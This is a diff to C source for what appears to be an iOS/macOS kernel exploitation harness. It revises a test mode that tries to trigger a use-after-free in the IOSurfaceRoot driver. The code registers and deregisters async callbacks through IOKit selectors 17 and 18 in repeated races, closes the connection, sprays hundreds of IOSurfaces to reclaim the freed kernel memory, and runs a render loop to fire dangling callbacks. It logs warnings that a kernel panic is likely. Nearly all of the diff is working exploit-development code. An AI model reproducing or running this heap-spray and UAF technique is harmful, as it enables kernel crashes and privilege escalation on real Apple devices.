@@ -19603,9 +19603,9 @@ new_modes:
             goto done;
         }
         if (rounds == 251) {
-            rlog("*** rounds=251: Connection-teardown UAF ***\n");
-            rlog("  Register async callbacks, close connection (frees entries),\n");
-            rlog("  spray IOSurfaces to reclaim freed memory, render to fire dangling callbacks\n\n");
+            rlog("*** rounds=251: Exact r=206 pattern + spray + render ***\n");
+            rlog("  Sequential sel17+sel18 on SAME connection (proven to work),\n");
+            rlog("  then close connection, spray IOSurfaces, render\n\n");
 
             char r251_sp[256];
             { char *h = getenv("HOME"); snprintf(r251_sp, sizeof(r251_sp), "%s/Documents/uaf251_state.bin", h?h:"/tmp"); }
@@ -19619,50 +19619,15 @@ new_modes:
                 IOServiceMatching("IOSurfaceRoot"));
             if (!r251_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r251_done; }
 
-            int r251_num_conns = 10;
-            int r251_regs_per_conn = 200;
-            int r251_spray_count = 500;
-            if (argc > 3) r251_num_conns = atoi(argv[3]);
-            if (argc > 4) r251_regs_per_conn = atoi(argv[4]);
-            if (argc > 5) r251_spray_count = atoi(argv[5]);
-            rlog("  Connections: %d  Regs/conn: %d  Spray: %d\n",
-                 r251_num_conns, r251_regs_per_conn, r251_spray_count);
+            int r251_races = 20;
+            int r251_iters = 50;
+            int r251_spray = 500;
+            if (argc > 3) r251_races = atoi(argv[3]);
+            if (argc > 4) r251_iters = atoi(argv[4]);
+            if (argc > 5) r251_spray = atoi(argv[5]);
+            rlog("  Races: %d  Iters/race: %d  Spray: %d\n",
+                 r251_races, r251_iters, r251_spray);
 
-            int r251_total_regs = r251_num_conns * r251_regs_per_conn;
-            mach_port_t *r251_wps = calloc(r251_total_regs, sizeof(mach_port_t));
-            for (int i = 0; i < r251_total_regs; i++) {
-                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &r251_wps[i]);
-                mach_port_insert_right(mach_task_self(), r251_wps[i], r251_wps[i], MACH_MSG_TYPE_MAKE_SEND);
-            }
-            rlog("  Allocated %d wake ports\n", r251_total_regs);
-
-            io_connect_t *r251_conns = calloc(r251_num_conns, sizeof(io_connect_t));
-            int r251_reg_ok = 0, r251_reg_fail = 0;
-
-            for (int c = 0; c < r251_num_conns; c++) {
-                IOServiceOpen(r251_svc, mach_task_self(), 0, &r251_conns[c]);
-                if (!r251_conns[c]) { rlog("  conn %d failed\n", c); continue; }
-
-                uint64_t inp[3] = {1, 2, 3};
-                for (int r = 0; r < r251_regs_per_conn; r++) {
-                    int idx = c * r251_regs_per_conn + r;
-                    uint64_t ref = 0xD251 + idx;
-                    kern_return_t kr = IOConnectCallAsyncMethod(r251_conns[c], 17,
-                        r251_wps[idx], &ref, 1,
-                        NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
-                    if (kr == 0) r251_reg_ok++;
-                    else r251_reg_fail++;
-                }
-            }
-            rlog("  Phase 1: Registered %d/%d async callbacks\n", r251_reg_ok, r251_reg_fail);
-
-            rlog("  Phase 2: Closing all connections (freeing kernel entries)...\n");
-            for (int c = 0; c < r251_num_conns; c++) {
-                if (r251_conns[c]) IOServiceClose(r251_conns[c]);
-            }
-            rlog("  All connections closed — entries freed\n");
-
-            rlog("  Phase 3: Spraying %d IOSurfaces...\n", r251_spray_count);
             CFMutableDictionaryRef r251_props = CFDictionaryCreateMutable(NULL, 0,
                 &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
             int r251_w = 32, r251_h = 32, r251_bpe = 4, r251_pf = 0x42475241;
@@ -19675,39 +19640,75 @@ new_modes:
             CFDictionarySetValue(r251_props, CFSTR("IOSurfaceBytesPerElement"), r251_bn);
             CFDictionarySetValue(r251_props, CFSTR("IOSurfacePixelFormat"), r251_pfn);
 
-            IOSurfaceRef *r251_surfs = calloc(r251_spray_count, sizeof(IOSurfaceRef));
-            int r251_spray_ok = 0;
-            for (int i = 0; i < r251_spray_count; i++) {
-                r251_surfs[i] = IOSurfaceCreate(r251_props);
-                if (r251_surfs[i]) r251_spray_ok++;
+            for (int race = 0; race < r251_races; race++) {
+                rlog("\n  --- Race %d/%d ---\n", race + 1, r251_races);
+
+                io_connect_t r251_rc = IO_OBJECT_NULL;
+                IOServiceOpen(r251_svc, mach_task_self(), 0, &r251_rc);
+                if (!r251_rc) { rlog("  open failed\n"); continue; }
+
+                uint64_t r251_inp[3] = {1, 2, 3};
+                int r251_reg_ok = 0, r251_reg_fail = 0;
+                int r251_dereg_ok = 0, r251_dereg_fail = 0;
+                mach_port_t r251_wps[200];
+                int r251_wp_n = 0;
+
+                for (int i = 0; i < r251_iters; i++) {
+                    mach_port_t wp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                    mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+                    uint64_t ref = 0xD251 + i;
+
+                    kern_return_t rr = IOConnectCallAsyncMethod(r251_rc, 17, wp, &ref, 1,
+                        NULL, 0, r251_inp, 24, NULL, NULL, NULL, NULL);
+                    kern_return_t rd = IOConnectCallMethod(r251_rc, 18, NULL, 0,
+                        r251_inp, 24, NULL, NULL, NULL, NULL);
+
+                    if (rr == 0) r251_reg_ok++; else r251_reg_fail++;
+                    if (rd == 0) r251_dereg_ok++; else r251_dereg_fail++;
+
+                    if (r251_wp_n < 200) r251_wps[r251_wp_n++] = wp;
+                    else mach_port_deallocate(mach_task_self(), wp);
+                }
+                rlog("  Race: reg=%d/%d dereg=%d/%d\n",
+                     r251_reg_ok, r251_reg_fail, r251_dereg_ok, r251_dereg_fail);
+
+                /* Close connection — this frees any remaining registry entries */
+                IOServiceClose(r251_rc);
+
+                /* IMMEDIATELY spray IOSurfaces to reclaim freed memory */
+                IOSurfaceRef *r251_surfs = calloc(r251_spray, sizeof(IOSurfaceRef));
+                int r251_spray_ok = 0;
+                for (int i = 0; i < r251_spray; i++) {
+                    r251_surfs[i] = IOSurfaceCreate(r251_props);
+                    if (r251_surfs[i]) r251_spray_ok++;
+                }
+                rlog("  Sprayed %d/%d, rendering (3s)...\n", r251_spray_ok, r251_spray);
+
+                /* Render — compositor will walk IOSurface objects, hitting any reclaimed entries */
+                rlog("  >>> WARNING: KERNEL PANIC LIKELY <<<\n");
+                fflush(stdout);
+                p13_render_run = 1;
+                p13_render_frames = 0;
+                pthread_t r251_rt;
+                pthread_create(&r251_rt, NULL, p13_render_loop, NULL);
+                for (int s = 0; s < 3; s++) {
+                    usleep(1000000);
+                    rlog("  +%ds frames=%d\n", s+1, p13_render_frames);
+                }
+                p13_render_run = 0;
+                pthread_join(r251_rt, NULL);
+                rlog("  Survived race %d! frames=%d\n", race+1, p13_render_frames);
+
+                /* Cleanup spray and ports for next race */
+                for (int i = 0; i < r251_spray; i++)
+                    if (r251_surfs[i]) CFRelease(r251_surfs[i]);
+                free(r251_surfs);
+                for (int i = 0; i < r251_wp_n; i++)
+                    mach_port_deallocate(mach_task_self(), r251_wps[i]);
             }
-            rlog("  Sprayed %d/%d IOSurfaces\n", r251_spray_ok, r251_spray_count);
 
-            rlog("  Phase 4: Render loop (5s) — waiting for dangling callback to fire...\n");
-            rlog("  >>> WARNING: HIGH PROBABILITY OF KERNEL PANIC <<<\n");
-            fflush(stdout);
-
-            p13_render_run = 1;
-            p13_render_frames = 0;
-            pthread_t r251_rt;
-            pthread_create(&r251_rt, NULL, p13_render_loop, NULL);
-            for (int s = 0; s < 5; s++) {
-                usleep(1000000);
-                rlog("  +%ds frames=%d\n", s+1, p13_render_frames);
-            }
-            p13_render_run = 0;
-            pthread_join(r251_rt, NULL);
-
-            rlog("\n  === SURVIVED connection-teardown UAF! ===\n");
-            rlog("  Total frames=%d\n", p13_render_frames);
-
-            for (int i = 0; i < r251_spray_count; i++)
-                if (r251_surfs[i]) CFRelease(r251_surfs[i]);
-            free(r251_surfs);
-            for (int i = 0; i < r251_total_regs; i++)
-                mach_port_deallocate(mach_task_self(), r251_wps[i]);
-            free(r251_wps);
-            free(r251_conns);
+            rlog("\n  === SURVIVED all %d races! ===\n", r251_races);
             CFRelease(r251_props); CFRelease(r251_wn); CFRelease(r251_hn);
             CFRelease(r251_bn); CFRelease(r251_pfn);
             IOObjectRelease(r251_svc);
